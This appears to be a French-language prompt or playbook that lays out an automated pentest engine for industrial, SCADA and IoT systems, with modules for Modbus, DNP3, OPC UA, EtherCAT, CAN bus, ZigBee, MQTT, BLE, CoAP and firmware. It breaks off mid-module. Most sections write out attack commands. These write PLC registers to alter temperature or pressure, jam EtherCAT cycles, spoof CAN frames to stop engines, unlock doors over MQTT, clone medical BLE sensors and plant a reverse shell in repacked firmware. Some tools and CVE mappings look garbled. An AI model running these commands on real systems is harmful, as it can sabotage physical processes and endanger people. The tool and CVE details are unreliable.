
### 🔐 GIGAPROMPT STRATÉGIQUE : INFRASTRUCTURE EMBEDDED / SCADA / IOT (MOTEUR HEURISTIQUE AVANCÉ)

---

## 🧠 [TYPE_ABSTRAIT] HeuristicEmbeddedEngine
```plaintext
HeuristicEmbeddedEngine {
    observe(target: EmbeddedTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(next: NextStep) → CommandePentest[]
}
```

---

## 🧩 [TYPE_ABSTRAIT] EmbeddedTarget
```plaintext
EmbeddedTarget {
    ip: string,
    os_type: string,
    hardware_type: PLC | HMI | MCU | Router | Unknown,
    firmware: FirmwareImage,
    network_services: [string],
    physical_interfaces: [UART | SPI | JTAG | None],
    supported_protocols: [Modbus | OPCUA | MQTT | ZigBee | BLE | CoAP | Other],
    has_console_access: boolean,
    has_debug_interface: boolean,
    possible_credentials: [string],
    network_stack: OSI_Layers,
    cve_surface: [CVE],
    raw_signals: [Signal],
    output_logs: [string]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```plaintext
Signal {
    source: string,
    type: NetworkScan | PhysicalDump | FirmwareExtract | ProtocolAnalysis | CVEMatch,
    content: string,
    confidence: Low | Medium | High,
    metadata: any
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```plaintext
Hypothesis {
    type: VulnType,
    signals: Signal[],
    associated_cve: [CVE],
    impact: Low | Medium | High | Critical,
    confirmed: boolean,
    test_chain: [Experiment]
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```plaintext
Experiment {
    outil: string,
    arguments: string,
    precondition: string,
    expected_result: string,
    followup: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```plaintext
Observation {
    tool_used: string,
    result: string,
    confirmed: boolean,
    reasoning: string,
    linked_signal: Signal
}
```

---

## 🧭 [TYPE_ABSTRAIT] NextStep
```plaintext
NextStep {
    decision_type: Continue | Escalate | Branch | Stop,
    description: string,
    recommended_command: CommandePentest
}
```

---

## 🛠️ [TYPE_ABSTRAIT] CommandePentest
```plaintext
CommandePentest {
    tool: string,
    command: string,
    description: string,
    when_to_use: string,
    target: string
}
```

---

## ⚙️ MOTEUR CENTRAL : `engine_infra_embedded(target: EmbeddedTarget)`

Ce moteur heuristique analyse dynamiquement la cible embarquée ou SCADA via des signaux déclencheurs. Il orchestre tous les modules suivants :

- `engine_proto_modbus()`, `engine_proto_opcua()`, `engine_proto_mqtt()`, `engine_proto_coap()`, etc.
- `engine_proto_canbus()`, `engine_proto_zigbee()`, `engine_proto_ble()`
- `engine_firmware_backdoor()`, `engine_firmware_binwalk()`
- `engine_hw_jtag_uart()`, `engine_hw_spi_flashdump()`
- `engine_exfil_loot_embedded()`, `engine_reverse_appliance()`
- `engine_ics_hmi()`, `engine_ics_plc()`, `engine_scada_authentication()`, `engine_password_hardcoded()`

---

## 🔁 PSEUDOCODE HEURISTIQUE (LOGIQUE ORCHESTRATION)

```plaintext
1. target = reconnaissance_initiale(input)
2. signals = observe(target)
3. for signal in signals:
    hypotheses = match(signal)
    for hypothesis in hypotheses:
        experiments = test(hypothesis)
        for experiment in experiments:
            obs = execute(experiment)
            steps = reason(obs)
            for step in steps:
                react(step)
```

---

### MODULE : `engine_proto_dnp3()`

**DESCRIPTION**  
Analyse du protocole DNP3 (Distributed Network Protocol) utilisé dans les SCADA, sous-stations électriques et ICS :  
- Fingerprinting du stack DNP3 (niveau de sécurité)  
- Lecture d’états binaires/analogiques  
- Détection de failles d’authentification ou de spoofing  
- Injection de trames altérées, fuzzing de commandes

---

#### 🔎 PHASE 1 : SCAN & FINGERPRINTING
```bash
nmap -sS -p20000 --script dnp3-info <target>
```
- Identifie version, station ID, supports de secure authentication

---

#### 🔍 PHASE 2 : ENUMÉRATION ACTIVE
```bash
dnp3cat -t <target> --scan
```
- Recherche de points analogiques, binaires, statiques
- Liste des IDs d'objets lisibles

---

#### 🧨 PHASE 3 : EXPLOIT / FUZZING
```bash
dnp3fuzz -t <target> --attack write --object-id 0x01
```
- Tentative de falsification de l’état d’un objet
- Simulation de commandes d’arrêt/démarrage d’un relais

---

#### 🛡️ PHASE 4 : SECURE AUTH DETECTION
```bash
dnp3-auth-test.py --target <target>
```
- Vérifie si le secure authentication est activé (IEEE-1815-2012)
- Contournement de l’authentification dans configurations faibles

---

#### 🧠 PHASE 5 : HEURISTIQUE
- Si absence de cryptage ou secure auth → vulnérabilité critique
- Si modification de registres possible sans retour d'erreur → exploitation autorisée

---

#### 📦 SCRIPTING
```plaintext
dnp3_enum.sh        → nmap + dnp3cat
dnp3_fuzz.sh        → dnp3fuzz injection
dnp3_auth_check.py  → Secure Auth test & logs
```

---

#### 📚 MAPPINGS
- MITRE ICS : T0853 (Unauthorized Device Access), T0856 (Command Injection)  
- CVE : CVE-2015-5374, CVE-2020-10612  

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/dnp3/device_map.txt
/output/iot/<target>/dnp3/fuzz_report.json
/output/iot/<target>/dnp3/auth_check.log
```

---

### MODULE : `engine_proto_modbus()`

**DESCRIPTION**  
Analyse avancée du protocole **Modbus/TCP**, utilisé dans les systèmes SCADA, ICS et IoT industriels pour la supervision/commande directe d’automates (PLC, RTU) :  
- Scan des unités Modbus  
- Lecture/écriture de registres sensibles (coil, input, holding)  
- Abus d’opcodes (write, diagnostics)  
- Cartographie de processus industriels (pompes, moteurs, capteurs, etc.)

---

#### 🔎 PHASE 1 : DÉTECTION MODBUS
```bash
nmap -sV -p502 --script modbus-discover <target>
```
- Détecte la présence de Modbus
- Identifie l’ID d’unité (unit ID), version, fonction supportées
- Tente de lire des registres si possible

---

#### 🧭 PHASE 2 : ENUMÉRATION D’UNITÉS & MAPPAGE
```bash
modscan <target>
```
- Scan des unit ID (1–247)
- Vérifie la réactivité, fonctions supportées, coils/registers accessibles

```bash
mbtget -r 0:10 -t 3 -i <target>
```
- Tente de lire les 10 premiers **input registers** (type 3)

---

#### 🧨 PHASE 3 : ABUS D’INSTRUCTIONS
```bash
mbtget -r 0 -t 5 -w 1 -i <target>
```
- Envoie un Write Single Coil → déclenche une action : moteur, alarme, relais, etc.

```bash
modbus-cli write-coil --unit 1 --coil 2 --value on --host <target>
```

```bash
modbus-cli write-register --unit 1 --register 30001 --value 9999 --host <target>
```
- Change la température, pression, vitesse sur automate mal configuré

---

#### 📈 PHASE 4 : FUZZING MODBUS
```bash
modfuzz.py --target <target> --range 0-100 --type write
```
- Injection massive sur coils/registers
- Détecte les zones critiques et comportement anormal de l’unité cible

---

#### 🔒 PHASE 5 : AUTH / FAILURES
- Modbus est un protocole **sans authentification**, sans chiffrement
- Tout accès en clair → ⚠️ critique si accessible depuis réseau interne

---

#### 🧠 PHASE 6 : HEURISTIQUE
- Si coil 0 = 1 → moteur activé ?
- Si register 30001 modifiable et contrôle réel sur process → vulnérabilité majeure
- Si unit ID répond à 43/14 → device info + fingerprinting complet

---

#### 📦 SCRIPTING
```plaintext
modbus_enum.sh       → nmap + modscan
modbus_fuzz.sh       → write fuzzing & log
modbus_inject.sh     → payload par type de process
```

---

#### 📚 MAPPINGS
- MITRE ICS : T0806 (Control Device Command Message), T0860 (Unauthorized Command), T0856 (Data Historian Compromise)
- CVEs : CVE-2018-14818, CVE-2019-6826, CVE-2021-22779

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/modbus/coil_map.json
/output/iot/<target>/modbus/fuzz_results.log
/output/iot/<target>/modbus/injections_sent.txt
```

---



### MODULE : `engine_proto_opcua()`

**DESCRIPTION**  
Audit du protocole **OPC UA (Open Platform Communications Unified Architecture)**, utilisé pour les communications sécurisées entre PLC, SCADA, HMI, et ERP dans les infrastructures industrielles modernes.  
Ce module permet :
- La détection de serveurs OPC UA
- L’extraction de l’arborescence des nœuds (address space)
- L’invocation de méthodes distantes
- La recherche de configurations faibles, d’accès en lecture/écriture non restreints
- L’abus d’interfaces de contrôle

---

#### 🔎 PHASE 1 : DÉTECTION DE SERVEURS OPC UA
```bash
nmap -sV -p 4840 --script opcua-info <target>
```
- Détection du service OPC UA
- Récupération des endpoints
- Informations sur le mode de sécurité (None, Sign, SignAndEncrypt)

---

#### 🧭 PHASE 2 : ENUMERATION DES NŒUDS
```bash
opcua-client -e opc.tcp://<target>:4840 --dump
```
- Affichage de la hiérarchie complète de l’address space
- Requête des objets : Sensors, PLCs, Controls, Methods
- Dump XML / JSON de l’arborescence

---

#### 🔓 PHASE 3 : TESTS D’ACCÈS ET DE MÉTHODES
```bash
opcua-commander read -e opc.tcp://<target>:4840 -n "ns=2;i=1024"
opcua-commander write -e opc.tcp://<target>:4840 -n "ns=2;i=1024" --value "true"
opcua-commander call -e opc.tcp://<target>:4840 -m "ns=2;i=5000"
```
- Test de lecture d’état (plage de température, statuts moteur)
- Test d’écriture non autorisée
- Appel à distance de méthodes dangereuses

---

#### 🔬 PHASE 4 : FUZZING / BRUTEFORCE
```bash
opcua-fuzzer --target opc.tcp://<target>:4840 --attack write-node-values
```
- Injecte des valeurs aléatoires dans les nœuds d’entrée
- Évalue la tolérance aux erreurs, DoS, crashs contrôlés

---

#### 🔐 PHASE 5 : SÉCURITÉ & CRYPTAGE
- Vérification des modes de sécurité
- Si `SecurityPolicy=None` + Anonymous Login → Vulnérable
- Si modes `Sign` ou `Encrypt` sans contrôle d’accès granulaire → Failles potentielles

---

#### 🧠 PHASE 6 : HEURISTIQUE
- Si `read/write` autorisé sur des nœuds critiques → possibilité de sabotage
- Si accès anonyme à `Server/Admin` → compromission du serveur complet
- Si appels de méthodes via `Call()` acceptés → exécution non autorisée possible

---

#### 📦 SCRIPTING
```plaintext
opcua_enum.sh     → Dump complet des nœuds
opcua_write_test.sh → Essai d’écriture sur variables critiques
opcua_call_test.sh  → Invocation méthodes distantes
opcua_fuzz.sh     → fuzzing & DoS des endpoints
```

---

#### 📚 MAPPINGS
- MITRE ATT&CK ICS : T0851 (Manipulation of Control), T0814 (Manipulation of View), T0821 (Loss of Safety)
- CVEs : CVE-2021-27438, CVE-2021-32979, CVE-2022-32234

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/opcua/address_space.json
/output/iot/<target>/opcua/method_invocations.log
/output/iot/<target>/opcua/fuzz_results.txt
/output/iot/<target>/opcua/write_access_nodes.txt
```

---

### MODULE : `engine_proto_ethercat()`

**DESCRIPTION**  
Audit du protocole **EtherCAT (Ethernet for Control Automation Technology)**, un bus terrain industriel temps réel largement utilisé dans les systèmes de contrôle en automatisation, robotique, CNC, etc.  
Ce module identifie :
- Topologie des esclaves EtherCAT
- Vulnérabilités dans les trames de contrôle
- Possibilités d’attaque sur le cycle d’esclave (slave state)
- Manipulations non autorisées de données de processus (PDO)

---

#### 🛰️ PHASE 1 : SCAN PASSIF & DISCOVERY
```bash
wireshark (filter : ethercat)
```
- Capture de trames EtherCAT (ECAT)
- Identification des commandes : APWR, APRD, BRD, LRD...
- Détection des ID d’esclaves, des commandes OP/SAFEOP

---

#### 🔍 PHASE 2 : ENUMÉRATION DES NŒUDS ECAT
```bash
ethercat slaves
```
- Liste les esclaves présents
- ID, Vendor, Type, Firmware
- Mapping topologique (ordre, hiérarchie)

```bash
ethercat pdos
ethercat upload -p <slave_id>
```
- Extraction des PDOs (Process Data Objects)
- Dump du contenu d’esclave pour analyse manuelle

---

#### 🧨 PHASE 3 : MANIPULATION & FAUSSE COMMANDE
```bash
ethercat download -p <slave_id> --index 0x6040 --subindex 0x00 --type uint16 --value 0x000F
```
- Injection directe dans les registres de contrôle
- Forçage d’un état `OPERATIONAL` → `SAFEOP`
- Possibilité de bloquer ou stopper les actuateurs

---

#### ⚠️ PHASE 4 : ABUS DE CYCLE TEMPOREL
- Insertion de délai dans les trames
- Forçage de désynchronisation maître-esclave
- Analyse en temps réel avec `ecat-tool` ou `TwinCAT`

---

#### 🔥 PHASE 5 : DENIAL OF SERVICE & CRASH TESTING
- Envoi de trames invalides
- Overload de requêtes APWR vers des registres critiques

```bash
ethercat dos --target <slave_id> --method cyclejam
```

---

#### 📜 SCRIPTING
```plaintext
ethercat_enum.sh       → Liste des esclaves + dump PDOs
ethercat_inject.sh     → Command injection vers PDO
ethercat_dos.sh        → Lancement d’un jam cycle
ethercat_sync_check.sh → Analyse synchro maître-esclaves
```

---

#### 📚 MAPPING
- MITRE ATT&CK ICS : T0835 (Impair Process Control), T0820 (Modify Parameter), T0851 (Manipulation of Control)
- CVEs : CVE-2020-25180 (TwinCAT Sync DoS), CVE-2021-34990

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/ethercat/slave_map.txt
/output/iot/<target>/ethercat/pdo_dump.txt
/output/iot/<target>/ethercat/fault_injection.log
/output/iot/<target>/ethercat/desync_results.json
```

---

### MODULE : `engine_proto_canbus()`

**DESCRIPTION**  
Audit et intrusion sur **CAN Bus (Controller Area Network)**, réseau embarqué omniprésent dans les véhicules, l’industrie, les automates, l’aéronautique et les systèmes critiques embarqués.  
Ce module identifie :
- Topologie des ECUs sur le bus
- Patterns des trames CAN
- Failles d’injection, fuzzing, spoofing, sniffing passif
- Logique de reverse engineering des IDs CAN
- Manipulations en temps réel (frein, moteur, etc.)

---

#### 🔌 PHASE 1 : INTERFACE & CAPTURE
```bash
sudo ip link set can0 up type can bitrate 500000
candump can0
```
- Activation de l’interface CAN (via socketcan)
- Capture des trames CAN
- Identification d’ECU actifs (ECM, BCM, TCU…)

---

#### 🧭 PHASE 2 : TOPOLOGIE & ANALYSE
```bash
cansniffer can0 -c
```
- Détection automatique des trames évolutives
- Couleurs sur variation → valeur dynamique

```bash
canplayer -I dump.log
```
- Relecture de sessions
- Analyse temporelle des trames

---

#### 🧪 PHASE 3 : FUZZING & REVERSE ID
```bash
canafuzz -i can0 -t 0x123 -d 8 -p random
```
- Envoi aléatoire ou forcé vers ID suspects
- Détection comportementale de réponse (brake, open door)

```bash
isotpsend can0 0x7DF 02 01 0C
isotprecv can0
```
- Diagnostic PID (OBD-II scan) via ISO-TP
- Retour RPM, throttle, coolant, etc.

---

#### 💀 PHASE 4 : SPOOFING & INJECTION
```bash
cansend can0 123#1122334455667788
```
- Spoof ID avec payloads custom
- Possibilité de forcer unlock/lock, start/stop moteur

```bash
python spoof.py --id 0x120 --data "00 FF 00 FF 00 00"
```

---

#### 🧠 PHASE 5 : AUTOMATISATION & SÉCURISATION
- Génération dynamique de règles de détection d’injection
- Mapping des ID suspects / critiques
- Intégration à Suricata / Zeek si passerelle CAN↔IP

---

#### 📜 SCRIPTING
```plaintext
can_enum.sh       → Activation + dump
can_sniff.sh      → cansniffer + capture colorée
can_fuzz.sh       → fuzz CAN IDs sensibles
can_inject.sh     → spoofing d’ID + replay
can_diag.sh       → Diagnostic ISO-TP
```

---

#### 📚 MAPPING
- MITRE ATT&CK for Mobile : T1423 (Exploit OS Vulnerability), T1443 (Abuse Physical Interfaces)
- CVEs : CVE-2017-8839, CVE-2018-15588 (Tesla CAN remote injection)
- Standards : ISO 11898-1, ISO 15765-2 (ISO-TP)

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/canbus/can_ids_list.txt
/output/iot/<target>/canbus/sniffed_dynamic_ids.log
/output/iot/<target>/canbus/spoof_log.log
/output/iot/<target>/canbus/diag_response.txt
```

---

### MODULE : `engine_proto_zigbee()`

**DESCRIPTION**  
Pentest du protocole **ZigBee** utilisé dans les réseaux sans fil maillés de type domotique, industriel, médical ou IoT (lampes Hue, serrures connectées, capteurs industriels…).  
Ce module détecte :
- Réseaux ZigBee 802.15.4 actifs
- Devices associés (coordinator, router, endpoint)
- Failles d’association non sécurisée
- Traffic sniffing, injection, commande à distance
- Exploits de ZigBee sur devices vulnérables (Hue, Xiaomi…)

---

#### 📡 PHASE 1 : SCAN & SNIFFING
```bash
killerbee-zbstumbler -i /dev/ttyUSB0
```
- Détection des PAN ID
- Réseaux ZigBee actifs, fréquence, RSSI

```bash
zbdump -i /dev/ttyUSB0 -f zigbee.pcap
```
- Sniffing passif du réseau
- Capture de l’association et des commandes

---

#### 🔍 PHASE 2 : ENUMÉRATION & TOPOLOGIE
```bash
zbfind -i /dev/ttyUSB0
```
- Découverte des endpoints
- Mapping des devices (Coordinator/Router/EndDevice)

```bash
zbdump --list-clusters --show-zcl
```
- Extraction des clusters ZCL : Light, On/Off, Lock, etc.

---

#### 🎯 PHASE 3 : INJECTION & TESTS
```bash
zbfakebeacon -i /dev/ttyUSB0 -p 0x1337 -c 11
```
- Beacon spoofing → brouillage réseau

```bash
zbassocflood -i /dev/ttyUSB0 -p 0x1337 -n 50
```
- Flood des requêtes d’association

```bash
zbreplay -f captured_command.cap
```
- Rejeu de trames vers les devices (ex : lumière on/off)

---

#### 🔐 PHASE 4 : BYPASS / ABUS
```bash
zbkeyrecover -i zigbee.pcap
```
- Tentative de récupération de la clé de réseau (ZigBee legacy)

```bash
zbstumbler -k key.hex -i /dev/ttyUSB0
```
- Injection sécurisée avec clé prépartagée

---

#### ⚔️ PHASE 5 : ATTACK CHAINS
- Injection de commandes ON/OFF / Lock / DoorOpen
- Hijack d’appareils sans authentification
- Mapping cluster → attaque ciblée (ZCL On/Off, ZCL IAS)

---

#### 📜 SCRIPTING
```plaintext
zigbee_enum.sh       → Scan + beacon
zigbee_sniff.sh      → zbdump pcap
zigbee_replay.sh     → Replay ON/OFF
zigbee_key.sh        → tentative de récupération de clé
zigbee_attack.sh     → flood, spoof, unlock
```

---

#### 📚 MAPPING
- MITRE ATT&CK for ICS : T0860 (Wireless Sniffing), T0861 (Wireless Injection)
- CVEs : CVE-2020-6007 (ZigBee RCE), CVE-2018-20067 (Hue remote takeover)
- Frameworks : ZigBee 3.0, ZCL (Cluster Library), IEEE 802.15.4

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/zigbee/network_map.txt
/output/iot/<target>/zigbee/packets.pcap
/output/iot/<target>/zigbee/injection_log.txt
/output/iot/<target>/zigbee/cluster_enum.md
```

---

### MODULE : `engine_proto_mqtt()`

**DESCRIPTION**  
Pentest du protocole **MQTT (Message Queuing Telemetry Transport)**, massivement utilisé dans les déploiements IoT/SCADA, domotiques ou médicaux.  
Ce module détecte et abuse :
- Brokers MQTT publics ou mal configurés
- Topics exposés en lecture/écriture
- Absence d’authentification
- Utilisation de credentials faibles
- Injection de payloads malveillants ou DoS

---

#### 🌐 PHASE 1 : SCAN & DÉTECTION DE BROKER
```bash
nmap -p 1883,8883 --script mqtt-subscribe,mqtt-connect <target>
```
- Détection de serveurs MQTT
- Test de connexions anonymes

```bash
mosquitto_sub -h <target> -t '#' -v
```
- Tentative d’abonnement anonyme à tous les topics (`#`)
- Affichage des messages transitant

---

#### 🔍 PHASE 2 : ENUMERATION DE TOPICS
```bash
mqtt-spy | mqtt-explorer
```
- Outils GUI pour auto-discovery des topics
- Visualisation temps réel des communications

```bash
mosquitto_sub -h <target> -u admin -P admin -t '#' -v
```
- Bruteforce login/password (cf. `hydra mqtt`)

---

#### 🧨 PHASE 3 : INJECTION & TESTS
```bash
mosquitto_pub -h <target> -t 'iot/door/lock' -m 'open'
```
- Envoi de messages malveillants si contrôle sans auth

```bash
mosquitto_pub -h <target> -t '$SYS/broker/clients/disconnect' -m ''
```
- DoS via messages spéciaux `$SYS/`

```bash
python3 mqtt-pwn.py -h <target> --scan
```
- Scan automatisé avec test vulnérabilités + injects

---

#### 🛡️ PHASE 4 : AUTH/SSL & CERTS
```bash
mosquitto_pub -h <target> --cafile ca.crt --cert client.crt --key client.key -t 'test/topic' -m 'auth test'
```
- Test des brokers sécurisés (port 8883)
- Validité et usage des certificats

---

#### ⚔️ PHASE 5 : POST-EXPLOIT
- Injection dans chaînes de capteurs → exfil de data
- Rebind MQTT sur broker malveillant (redirect DNS)
- Détection d’infra industrielle mal sécurisée (temps réel, alarme, HMI)

---

#### 📜 SCRIPTING
```plaintext
mqtt_enum.sh        → sub + list + brute
mqtt_inject.sh      → payloads malveillants
mqtt_dos.sh         → flood & disconnect
mqtt_ssl_test.sh    → test SSL MQTTs
```

---

#### 📚 MAPPING
- MITRE ATT&CK for ICS : T0865 (Service Exploitation), T0886 (Compromise Protocol)
- CVEs : CVE-2017-7650 (DoS), CVE-2020-13849 (exposure), CVE-2020-11995
- RFC 6455 / MQTT v3.1.1 / v5.0

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/mqtt/topic_list.txt
/output/iot/<target>/mqtt/malicious_payloads.log
/output/iot/<target>/mqtt/ssl_config.md
/output/iot/<target>/mqtt/full_capture.pcap
```

---

### MODULE : `engine_proto_ble()`

**DESCRIPTION**  
Pentest du protocole **Bluetooth Low Energy (BLE)** utilisé dans :
- Appareils médicaux (glucomètres, pacemakers)
- Smart locks / trackers / montres connectées
- IoT industriels, beacons, SCADA mobiles

Ce module vise à :
- Scanner les périphériques BLE à proximité
- Lire les services/characteristics accessibles
- Détecter les défauts de permissions (auth/bond)
- Interagir et injecter des commandes
- Simuler ou cloner des périphériques

---

#### 📡 PHASE 1 : SCAN DE PÉRIPHÉRIQUES BLE
```bash
hcitool lescan
```
- Découverte des appareils BLE en broadcast

```bash
bluetoothctl
scan on
```
- Mode interactif de scan et pairing

```bash
blescan.py -i hci0
```
- Scan approfondi Python

---

#### 🧭 PHASE 2 : ENUMERATION DES SERVICES / CARACTÉRISTIQUES
```bash
gatttool -b <MAC_ADDR> --interactive
[>] connect
[>] primary
[>] characteristics
```

```bash
gattacker scan
gattacker clone <MAC_ADDR>
```
- Clonage et injection

```bash
bleah -t <MAC_ADDR> -e
```
- Extraction brute de tous les attributs BLE

---

#### 🛠️ PHASE 3 : VÉRIFICATION DES DROITS & TESTS
```bash
gatttool --char-read -a 0x0025
gatttool --char-write-req -a 0x0025 -n 010203
```
- Lecture / écriture de characteristics sans auth

```bash
bettercap -eval "ble.recon on"
```
- Interception BLE + sniffing + MITM

---

#### ⚔️ PHASE 4 : ATTACKS & ABUSE
```bash
bleno / noble
```
- Créer un périphérique BLE malveillant

```bash
bleah --crash <MAC_ADDR>
```
- Fuzzing de packet → crash / reboot device

```bash
btlejack -i /dev/ttyUSB0 -f
```
- Sniffing de paquets BLE (non encrypted), injection brute

---

#### 🧬 PHASE 5 : CLONAGE & PERSISTANCE
```bash
gattacker clone <MAC>
gattacker inject-service "Heart Rate" → data falsifiée
```
- Clonage de capteur industriel

---

#### 📜 SCRIPTING
```plaintext
ble_scan.sh        → hcitool + bleah
ble_enum.sh        → gatttool + dump
ble_fuzz.sh        → bettercap + bleah --crash
ble_clone.sh       → gattacker + bleno
```

---

#### 📚 MAPPING
- MITRE T0807 (Wireless Compromise)
- CVE-2019-19194 (Bluetooth leakage), CVE-2020-0022 (BlueFrag), CVE-2021-34143
- BLE GATT/ATT layer exploitation

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/ble/devices_found.txt
/output/iot/<target>/ble/char_services_dump.json
/output/iot/<target>/ble/fuzz_results.log
/output/iot/<target>/ble/cloned_device_sim.log
```

---

### MODULE : `engine_proto_coap()`

**DESCRIPTION**  
Pentest du protocole **CoAP (Constrained Application Protocol)** utilisé principalement dans :
- Réseaux IoT industriels à basse consommation (domotique, capteurs environnementaux, SCADA)
- Appareils connectés via UDP 5683
- Environnements IPv6/6LoWPAN (IoT Mesh)

Ce module vise à :
- Scanner les services CoAP exposés
- Enumérer les ressources via /.well-known/core
- Exploiter les faiblesses d’authentification, injection ou DoS
- Capturer les réponses et simuler des nœuds

---

#### 📡 PHASE 1 : SCAN DE SERVICES COAP
```bash
nmap -sU -p 5683 --script coap-resources <target>
```
- Détection des ressources CoAP exposées via Nmap NSE

```bash
coap-client -m get coap://<target>/.well-known/core
```
- Enumération manuelle des ressources disponibles

```bash
zgrab2 --senders 100 --timeout 10 --coap --targets <IP_LIST>
```
- Scan massif des ressources CoAP

---

#### 🔍 PHASE 2 : ENUMERATION DES RESSOURCES
```bash
coap-client -m get coap://<target>/<resource>
```

```bash
aiocoap-client coap://<target>/<resource>
```

```bash
coap-cli --host <target> --port 5683 --discover
```

---

#### ⚔️ PHASE 3 : EXPLOITATION
```bash
coap-client -m put -e "malicious_payload" coap://<target>/<resource>
```
- Tentative d’injection dans les endpoints non sécurisés

```bash
coap-client -m delete coap://<target>/<resource>
```
- Test DoS ou effacement abusif

```bash
coap-proxy --inject coap://<target>/<resource>
```
- Attaque via proxy inversé CoAP

---

#### 🔬 PHASE 4 : FUZZING & BRUTE
```bash
coap-fuzz.py --url coap://<target>/<resource>
```

```bash
fuzzcoap --input wordlist.txt --target coap://<target>
```
- Fuzzing bas niveau des entêtes, chemins et formats de données

---

#### 🧬 PHASE 5 : SIMULATION DE NOEUDS & REBOND
```bash
coap-server.py --resource /sensor --response "22.3C"
```
- Créer un faux nœud de température

```bash
aiocoap-client coap://localhost/sensor
```
- Validation de fonctionnement

---

#### 📜 SCRIPTING
```plaintext
coap_scan.sh      → nmap + coap-client
coap_enum.sh      → extraction core + dump ressources
coap_fuzz.sh      → coap-fuzz / fuzzcoap
coap_malicious.sh → delete / put payloads / redirect
```

---

#### 📚 MAPPING
- MITRE T0886 (Exploitation of Remote Services - IoT)
- CVE-2020-12688 (unauthorized POST abuse)
- CoAP injection in smart home automation

---

#### 📂 OUTPUTS
```plaintext
/output/iot/<target>/coap/resources.txt
/output/iot/<target>/coap/exploit_attempts.log
/output/iot/<target>/coap/fuzzing_results.json
/output/iot/<target>/coap/simulated_nodes.log
```

---

Parfait, on enchaîne avec :

---

### MODULE : `engine_firmware_binwalk()`

**DESCRIPTION**  
Module d’analyse avancée de firmwares embarqués (IoT, SCADA, routeurs, appliances) :
- Reverse engineering de firmwares
- Extraction automatique avec Binwalk, Firmwalker, Firmware-Mod-Kit
- Recherche de backdoors, mots de passe codés en dur, vulnérabilités connues (CVE)
- Mapping MITRE/CWE/CPE des composants trouvés

---

#### 📦 PHASE 1 : EXTRACTION AVEC BINWALK
```bash
binwalk -eM firmware.img
```
- Extraction recursive de toutes les partitions internes

```bash
binwalk -Me firmware.img --run-as=root
```
- Extraction avancée + accès root

```bash
firmware-mod-kit/extract-ng.sh firmware.img extracted/
```
- Alternative via firmware mod kit

---

#### 🔍 PHASE 2 : ENUMERATION & AUDIT
```bash
find extracted/ -name "*.sh" -or -name "*.conf" -or -name "*.bin"
```
- Repérage des fichiers sensibles

```bash
grep -iR "password" extracted/
```

```bash
firmwalker extracted/
```
- Analyse automatique des chemins suspects, clés SSH, utilisateurs, configurations faibles

```bash
strings -a -n 5 firmware.img | grep -Ei "root|admin|password"
```
- Recherche de chaînes exploitables

---

#### 🔓 PHASE 3 : ANALYSE DE BACKDOORS
```bash
grep -iR "telnetd" extracted/
```
- Telnet en démarrage automatique ?

```bash
grep -iR "dropbear" extracted/
```
- SSH embedded par défaut ?

```bash
grep -R "shadow" extracted/etc/
```
- Analyse des hashs root / utilisateurs par défaut

---

#### 🔍 PHASE 4 : SCAN DE CVEs
```bash
firmwalker --cve-check
```
- Recherche de composants vulnérables connus

```bash
cve-bin-tool extracted/
```
- Identification des versions de busybox, openssl, etc.

---

#### ⚔️ PHASE 5 : FAIBLESSES & PAYLOAD INJECTION
```bash
mount -o loop extracted/squashfs-root.img /mnt/fw/
```
- Modification directe dans système de fichiers

```bash
echo "reverse shell" >> /mnt/fw/etc/init.d/rcS
```

```bash
firmware-mod-kit/rebuild-ng.sh /mnt/fw new_firmware.img
```
- Repack firmware modifié

---

#### 📜 SCRIPTING
```plaintext
fw_extract.sh     → binwalk + firmwalker
fw_enum.sh        → grep + strings + firmwalker + cve-bin-tool
fw_patch.sh       → mount + inject + rebuild
```

---

#### 🧠 MAPPING
- MITRE T1547.009 (Boot or Logon Autostart via Firmware)
- CWE-912, CWE-798 (Hardcoded secrets / unauthorized interface)
- CVE-2019-18989, CVE-2020-29583 (unauth. firmware backdoor access)

---

#### 📂 OUTPUTS
```plaintext
/output/firmware/<target>/extracted_fs/
/output/firmware/<target>/users_hashes.txt
/output/firmware/<target>/suspect_files.log
/output/firmware/<target>/vuln_components.csv
/output/firmware/<target>/repack_result.img
```

---

### 🔐 MODULE : `engine_firmware_backdoor()`

#### 🧠 DESCRIPTION :
Détection, extraction et analyse de portes dérobées (backdoors) dans les firmwares IoT / SCADA / embarqués :
- Analyse statique et dynamique des firmwares
- Détection de comptes backdoor, telnet cachés, déclencheurs spécifiques
- Scan mémoire pour détection de chaînes connues ou déclencheurs
- Intégration d’outils comme Binwalk, Firmware-Mod-Kit, Firmwalker, Ghidra, QEMU
- Détection automatique de comportements MITRE T1204, T1059, T1070

---

#### 🔁 PHASE 1 : Extraction et unpack firmware
```
binwalk -eM <firmware>.bin
firmware-mod-kit/extract-firmware.sh <firmware>.bin
7z x <firmware>.zip -oextracted_fw/
```

→ /output/firmware/unpack/<hash_firmware>/rootfs/

---

#### 🔍 PHASE 2 : Recherche de comptes et accès backdoor
```
grep -i 'root' extracted_fw/etc/passwd
grep -ir 'telnetd' extracted_fw/
grep -ir 'dropbear' extracted_fw/
find extracted_fw/ -name '*.sh' | xargs grep -i 'nc -e' 
```

→ /output/firmware/backdoor/users_detected.txt  
→ /output/firmware/backdoor/services_detected.txt

---

#### 🧬 PHASE 3 : Analyse des fichiers binaires exécutables suspects
```
find extracted_fw/ -type f -perm -111 -exec file {} \; | grep -i 'ELF'
strings -a extracted_fw/bin/* | grep -i 'admin\|debug\|root'
radare2 -A extracted_fw/usr/bin/suspicious_daemon
```

→ /output/firmware/backdoor/binary_analysis.txt

---

#### 🛡️ PHASE 4 : Reversing dynamique (si architecture connue)
```
qemu-system-arm -M versatilepb -kernel vmlinuz -initrd initrd.img -nographic
Ghidra → analyse interactive du binaire
